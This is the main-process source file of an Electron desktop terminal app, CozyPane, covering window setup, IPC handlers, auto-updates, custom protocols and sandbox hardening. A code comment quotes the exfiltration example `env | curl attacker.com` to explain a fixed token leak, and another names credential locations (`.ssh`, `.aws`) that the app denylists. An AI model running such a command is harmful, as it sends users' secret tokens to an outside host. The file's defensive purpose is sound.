import * as Sentry from '@sentry/electron/main';
import { app, BrowserWindow, dialog, ipcMain, clipboard, net, protocol } from 'electron';
import path from 'path';
import fs from 'fs';
import os from 'os';
import { autoUpdater } from 'electron-updater';

import { registerPtyHandlers, killAllPtys, hasActivePtys, cleanupForSender } from './pty';
import { registerFsHandlers, addAllowedRoot, isPathAllowed } from './filesystem';
import { registerWatcherHandlers, closeWatcher } from './watcher';
import { registerSettingsHandlers } from './settings';
import { registerGitHandlers } from './git';
import { registerDeployHandlers, processProtocolUrl, getGithubToken, writeAskpassHelper, API_BASE } from './deploy';
import { registerPreviewHandlers } from './preview';
import { registerUpdateCheckerHandlers, startPeriodicCheck, stopPeriodicCheck } from './update-checker';
import { buildMenu } from './menu';
import { ensureCozypaneMcpConfig, wipeMcpConfig } from './mcp-config';
import { registerPrimaryWindow, getPrimaryWindow, broadcastAll } from './windows';

Sentry.init({
  dsn: 'https://1bebfbc7016910d1b36a0a3b6fc24ec6@o4510985332391936.ingest.de.sentry.io/4511211127636048',
  release: 'cozypane@' + app.getVersion(),
  environment: app.isPackaged ? 'production' : 'development',
  enabled: app.isPackaged,
});

// Register cozypane-media:// scheme for serving local media files to the
// renderer without base64-encoding them over IPC. Must be called before app.ready.
protocol.registerSchemesAsPrivileged([
  { scheme: 'cozypane-media', privileges: { standard: false, supportFetchAPI: true, stream: true } },
]);

// Global error handlers
process.on('uncaughtException', (err) => {
  Sentry.captureException(err);
  console.error('[CozyPane] Uncaught exception:', err);
  dialog.showErrorBox('CozyPane Error', `An unexpected error occurred:\n${err.message}`);
  killAllPtys();
  closeWatcher();
  app.exit(1);
});
process.on('unhandledRejection', (reason) => {
  Sentry.captureException(reason instanceof Error ? reason : new Error(String(reason)));
  console.error('[CozyPane] Unhandled rejection:', reason);
});

// Harden any <webview> attachments. Electron allows renderer code to set
// webPreferences attributes on <webview> elements, which can re-enable
// nodeIntegration or inject a custom preload script — both would escape
// the sandbox. Strip those fields at attach time so the renderer cannot
// grant itself elevated privileges through an attached webview.
app.on('web-contents-created', (_event, contents) => {
  contents.on('will-attach-webview', (_evt, webPreferences, _params) => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const prefs = webPreferences as any;
    delete prefs.preload;
    delete prefs.preloadURL;
    prefs.nodeIntegration = false;
    prefs.nodeIntegrationInSubFrames = false;
    prefs.contextIsolation = true;
    prefs.sandbox = true;
    prefs.webSecurity = true;
  });
  // Also refuse navigations to non-http(s) protocols from the main window.
  contents.on('will-navigate', (evt, url) => {
    try {
      const parsed = new URL(url);
      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:' && parsed.protocol !== 'file:' && parsed.protocol !== 'devtools:') {
        evt.preventDefault();
      }
    } catch { /* ignore — malformed URLs block */ evt.preventDefault(); }
  });
});

// Local reference kept only for dialog parenting and the close-confirm
// flow; sub-handlers route via event.sender or windows.ts helpers.
let mainWindow: BrowserWindow | null = null;
let forceQuit = false;
const isDev = !app.isPackaged;

// Single instance lock — needed for Windows/Linux protocol handler (second-instance event)
const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
  app.quit();
}

// Windows/Linux: protocol URLs arrive via argv in second instance
app.on('second-instance', (_event, argv) => {
  // Focus the primary window (single-window today, focused-most-recently
  // when multi-window eventually lands).
  const primary = getPrimaryWindow();
  if (primary) {
    if (primary.isMinimized()) primary.restore();
    primary.focus();
  }

  // Find cozypane:// URL in argv (last arg on Windows, varies on Linux)
  const protocolUrl = argv.find(arg => arg.startsWith('cozypane://'));
  if (protocolUrl) {
    broadcastAll('deploy:protocol-callback', protocolUrl);
    processProtocolUrl(protocolUrl);
  }
});

function createWindow() {
  forceQuit = false;
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    minWidth: 800,
    minHeight: 600,
    titleBarStyle: 'hiddenInset',
    trafficLightPosition: { x: 15, y: 15 },
    backgroundColor: '#1a1b2e',
    icon: path.join(__dirname, '../../build/icon.png'),
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true,
      webviewTag: true,
    },
  });

  if (isDev) {
    const port = process.env.VITE_DEV_PORT || '5173';
    mainWindow.loadURL(`http://localhost:${port}`);
    mainWindow.webContents.openDevTools({ mode: 'bottom' });
  } else {
    mainWindow.loadFile(path.join(__dirname, '../renderer/index.html'));
  }

  // Block Cmd/Ctrl+R reload (kills terminals) and default zoom (we handle per-panel)
  mainWindow.webContents.on('before-input-event', (_event, input) => {
    if (input.meta || input.control) {
      const key = input.key.toLowerCase();
      if (key === 'r') _event.preventDefault();
      // Prevent default webview zoom — handled per-panel in renderer
      if (key === '=' || key === '+' || key === '-' || key === '0') {
        _event.preventDefault();
      }
    }
  });

  mainWindow.on('close', (e) => {
    if (!forceQuit && hasActivePtys()) {
      e.preventDefault();
      dialog.showMessageBox(mainWindow!, {
        type: 'warning',
        buttons: ['Close', 'Cancel'],
        defaultId: 1,
        cancelId: 1,
        title: 'Close CozyPane?',
        message: 'Terminal sessions are still running. Are you sure you want to close?',
      }).then(({ response }) => {
        if (response === 0) {
          forceQuit = true;
          mainWindow?.close();
        }
      });
    }
  });

  // Clean up every PTY owned by this window's WebContents on close.
  const sender = mainWindow.webContents;
  mainWindow.on('closed', () => {
    cleanupForSender(sender);
    mainWindow = null;
  });

  registerPrimaryWindow(mainWindow);
}

// Register IPC handlers from modules.
//
// H3: PTYs no longer inherit COZYPANE_DEPLOY_TOKEN or COZYPANE_GH_TOKEN.
// Previously `env | curl attacker.com` from any shell leaked both tokens.
// The MCP server subprocess now reads the deploy token from the MCP
// config file's `env` block (written mode 0600 by ensureCozypaneMcpConfig),
// and the Git panel's push/pull commands inline the GH token via
// `wrapCommand` in git.ts — so neither case needs the tokens in the
// PTY environment.
//
// Non-secret env vars (API URL, user-data path) are still exported so
// the MCP server can locate itself when spawned ad-hoc.
registerPtyHandlers(() => {
  const env: Record<string, string> = {
    COZYPANE_API_URL: API_BASE,
    COZYPANE_USER_DATA: app.getPath('userData'),
  };
  return env;
});
registerFsHandlers();

// H2/H7: Seed the allowlist with the home directory so TabLauncher, default
// create-project flow, and generally non-project-specific operations work on
// first launch. Individual terminal cwds and user-picked directories are
// also added dynamically. The denylist inside filesystem.ts still blocks
// `.ssh`, `.aws`, `.claude.json`, and other sensitive locations even
// though home is allowlisted — which is the net tightening from H2.
addAllowedRoot(os.homedir());

registerWatcherHandlers();
registerSettingsHandlers();
registerGitHandlers();
registerDeployHandlers();
registerPreviewHandlers();
registerUpdateCheckerHandlers();

// File picker dialog
ipcMain.handle('fs:pickFile', async () => {
  if (!mainWindow) return { paths: [] };
  const result = await dialog.showOpenDialog(mainWindow, {
    properties: ['openFile', 'multiSelections'],
    title: 'Attach File',
  });
  return { paths: result.canceled ? [] : result.filePaths };
});

// Directory picker dialog
ipcMain.handle('fs:pickDirectory', async () => {
  if (!mainWindow) return { paths: [] };
  const result = await dialog.showOpenDialog(mainWindow, {
    properties: ['openDirectory'],
    title: 'Open Project',
  });
  const paths = result.canceled ? [] : result.filePaths;
  // Any directory the user explicitly picks becomes an allowed root for
  // subsequent filesystem / watcher operations (H2/H7).
  for (const p of paths) addAllowedRoot(p);
  return { paths };
});

// Save clipboard image to temp file
ipcMain.handle('fs:saveClipboardImage', async () => {
  const img = clipboard.readImage();
  if (img.isEmpty()) return { path: null };
  try {
    const tmpDir = path.join(os.tmpdir(), 'cozypane');
    fs.mkdirSync(tmpDir, { recursive: true, mode: 0o700 });
    const fileName = `clipboard-${Date.now()}.png`;
    const filePath = path.join(tmpDir, fileName);
    // Mode 0600 — clipboard screenshots often contain secrets, don't let
    // other processes on the machine read them via the world-readable tmpdir.
    fs.writeFileSync(filePath, img.toPNG(), { mode: 0o600 });
    return { path: filePath };
  } catch (err: any) {
    return { path: null, error: err.message };
  }
});

// Return the absolute path of the static cozypane MCP config file. The renderer
// passes this path to `claude --mcp-config` when launching a cozy-mode project
// so that only CozyPane-spawned terminals see the cozypane MCP server.
ipcMain.handle('mcp:getConfigPath', async () => {
  try {
    const configPath = ensureCozypaneMcpConfig();
    return { path: configPath };
  } catch (err: any) {
    return { error: err?.message || 'Failed to prepare cozypane MCP config' };
  }
});

// Check if clipboard has file paths (copied files in Finder)
ipcMain.handle('fs:clipboardFilePaths', async () => {
  // On macOS, copied files are available as file URLs
  if (process.platform === 'darwin') {
    const text = clipboard.read('NSFilenamesPboardType');
    if (text) {
      try {
        // NSFilenamesPboardType is a plist XML — parse file paths from it
        const paths: string[] = [];
        const matches = text.matchAll(/<string>([^<]+)<\/string>/g);
        for (const m of matches) {
          paths.push(m[1]);
        }
        if (paths.length > 0) return { paths };
      } catch (err) {
        console.warn('[CozyPane] Could not parse clipboard file paths:', err, text?.slice(0, 200));
      }
    }
  }
  return { paths: [] };
});

// Auto-updater
function setupAutoUpdater() {
  if (isDev) return;

  autoUpdater.autoDownload = true;
  autoUpdater.autoInstallOnAppQuit = true;

  autoUpdater.on('update-available', (info) => {
    console.log('[CozyPane] Update available:', info.version);
    broadcastAll('updater:status', { status: 'available', version: info.version });
  });

  autoUpdater.on('update-downloaded', (info) => {
    console.log('[CozyPane] Update downloaded:', info.version);
    broadcastAll('updater:status', { status: 'downloaded', version: info.version });
    const dialogParent = getPrimaryWindow();
    if (!dialogParent) return;
    dialog.showMessageBox(dialogParent, {
      type: 'info',
      title: 'Update Ready',
      message: `CozyPane ${info.version} has been downloaded.`,
      detail: 'It will be installed when you restart the app.',
      buttons: ['Restart Now', 'Later'],
    }).then(({ response }) => {
      if (response === 0) {
        // Force quit all windows first — macOS can block quitAndInstall otherwise
        BrowserWindow.getAllWindows().forEach(w => w.close());
        autoUpdater.quitAndInstall(false, true);
      }
    });
  });

  autoUpdater.on('error', (err) => {
    // M28: forward the error to the renderer so UpdateBanner can show a
    // diagnostic. Silent-only logging meant a broken auto-update channel
    // (network error, signature mismatch, disk full) went completely
    // unnoticed by users.
    console.error('[CozyPane] Auto-update error:', err.message);
    broadcastAll('updates:error', { message: err.message || 'Update failed' });
  });

  autoUpdater.checkForUpdates().catch((err: any) => console.error('[CozyPane] checkForUpdates failed:', err.message));
  // Check every 4 hours
  setInterval(() => autoUpdater.checkForUpdates().catch((err: any) => console.error('[CozyPane] checkForUpdates failed:', err.message)), 4 * 60 * 60 * 1000);
}

// CozyPane MCP visibility is scoped to sessions that CozyPane itself spawns.
// See `src/main/mcp-config.ts` for the extraction + config-file generation
// helpers. We never write .mcp.json into user project directories (to avoid
// machine-specific absolute paths leaking into git). Instead we keep one
// static .mcp.json inside CozyPane's userData dir, and when launching
// `claude` for a cozy-mode project, the renderer adds `--mcp-config <path>`
// to the auto-command. External terminals that don't pass that flag see no
// cozypane MCP at all — satisfying both scoping rules:
//   1. terminal must be CozyPane's PTY (only that launcher adds the flag)
//   2. project must be cozy mode (renderer only adds the flag when cozyMode === true)

// App lifecycle
app.whenReady().then(() => {
  // On macOS, warn if not running from /Applications (updates won't work properly)
  if (process.platform === 'darwin' && !app.isInApplicationsFolder()) {
    dialog.showMessageBox({
      type: 'warning',
      title: 'Move to Applications',
      message: 'CozyPane is not in the Applications folder.',
      detail: 'Auto-updates only work when the app is in /Applications. Would you like to move it now?',
      buttons: ['Move to Applications', 'Not Now'],
      defaultId: 0,
    }).then(({ response }) => {
      if (response === 0) {
        try {
          app.moveToApplicationsFolder();
        } catch (err: any) {
          dialog.showErrorBox('Move Failed', `Could not move to Applications folder:\n${err.message}`);
        }
      }
    });
  }

  // Register cozypane:// protocol for OAuth callbacks
  if (!app.isDefaultProtocolClient('cozypane')) {
    app.setAsDefaultProtocolClient('cozypane');
  }

  // Register cozypane-media:// protocol handler — serves local media files
  // directly to <img>/<video>/<audio> tags without base64 encoding over IPC.
  // Path must be in the security fence (isPathAllowed).
  protocol.handle('cozypane-media', (request) => {
    const filePath = decodeURIComponent(request.url.slice('cozypane-media://'.length));
    if (!isPathAllowed(filePath)) {
      return new Response('Forbidden', { status: 403 });
    }
    return net.fetch(`file://${filePath}`);
  });

  buildMenu();
  // Relax CSP for the Preview webview partition — the webview loads the
  // user's own dev server which makes its own API calls, loads external
  // images, etc. The renderer's strict CSP (connect-src 'self') would
  // block all of that. Override CSP headers for this partition only.
  const { session } = require('electron');
  const previewSession = session.fromPartition('persist:preview');
  previewSession.webRequest.onHeadersReceived((details: any, callback: any) => {
    const headers = { ...details.responseHeaders };
    // Remove any CSP headers so the webview content runs unrestricted
    delete headers['content-security-policy'];
    delete headers['Content-Security-Policy'];
    delete headers['content-security-policy-report-only'];
    delete headers['Content-Security-Policy-Report-Only'];
    callback({ responseHeaders: headers });
  });

  createWindow();
  setupAutoUpdater();
  startPeriodicCheck();
  // Ensure the static cozypane MCP config file exists so `claude --mcp-config` can find it.
  try { ensureCozypaneMcpConfig(); } catch (err) { console.error('[CozyPane] ensureCozypaneMcpConfig failed:', err); }
  // Write askpass helper if GitHub token exists (for git push/pull auth)
  if (getGithubToken()) writeAskpassHelper();
});

// Handle cozypane:// protocol URLs on macOS
app.on('open-url', (event, url) => {
  event.preventDefault();
  broadcastAll('deploy:protocol-callback', url);
  // Also process in main process for token exchange
  processProtocolUrl(url);
});

app.on('window-all-closed', () => {
  killAllPtys();
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

app.on('before-quit', (e) => {
  if (!forceQuit && mainWindow && hasActivePtys()) {
    e.preventDefault();
    dialog.showMessageBox(mainWindow, {
      type: 'warning',
      buttons: ['Quit', 'Cancel'],
      defaultId: 1,
      cancelId: 1,
      title: 'Quit CozyPane?',
      message: 'Terminal sessions are still running. Are you sure you want to quit?',
    }).then(({ response }) => {
      if (response === 0) {
        forceQuit = true;
        app.quit();
      }
    });
  } else {
    killAllPtys();
    closeWatcher();
    stopPeriodicCheck();
    cleanupClipboardTempFiles();
    wipeMcpConfig();
  }
});

// M9: wipe the per-user clipboard-image temp directory on quit. Individual
// clipboard images were being written to `os.tmpdir()/cozypane/clipboard-*.png`
// with no cleanup, accumulating forever (and tmpdir on macOS can be
// world-readable, which is bad for screenshots containing secrets).
function cleanupClipboardTempFiles(): void {
  try {
    const clipDir = path.join(os.tmpdir(), 'cozypane');
    if (!fs.existsSync(clipDir)) return;
    const files = fs.readdirSync(clipDir);
    for (const name of files) {
      if (name.startsWith('clipboard-') && name.endsWith('.png')) {
        try { fs.unlinkSync(path.join(clipDir, name)); } catch { /* ignore */ }
      }
    }
  } catch { /* non-fatal */ }
}
